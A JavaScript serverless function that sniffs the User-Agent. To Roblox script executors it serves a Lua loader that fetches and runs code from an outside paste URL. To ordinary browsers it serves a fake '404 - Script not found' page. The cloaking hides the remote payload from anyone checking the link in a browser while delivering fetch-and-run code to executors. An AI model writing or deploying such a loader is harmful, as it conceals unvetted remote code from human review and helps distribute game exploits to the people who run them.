// This is a serverless function that serves different content
// Save this as: api/script.js (for Vercel) or netlify/functions/script.js (for Netlify)

export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  
  // Check if request is from Roblox (game:HttpGet)
  const isRobloxRequest = userAgent.includes('Roblox') || 
                         userAgent.includes('HttpService') ||
                         userAgent.includes('RobloxStudio') ||
                         req.headers['roblox-id'] || // Some executors send this
                         (!userAgent.includes('Mozilla') && !userAgent.includes('Chrome')); // Most browsers have Mozilla/Chrome
  
  if (isRobloxRequest) {
    // Return the actual Lua script code for Roblox executors
    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(`-- Loaded successfully
loadstring(game:HttpGet("https://pastefy.app/7NC2uDgT/raw"))()`);
  } else {
    // Return HTML 404 page for browsers
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Script not found</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background-color: #1a1a1a;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 14px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    404 - Script not found
</body>
</html>`);
  }
}
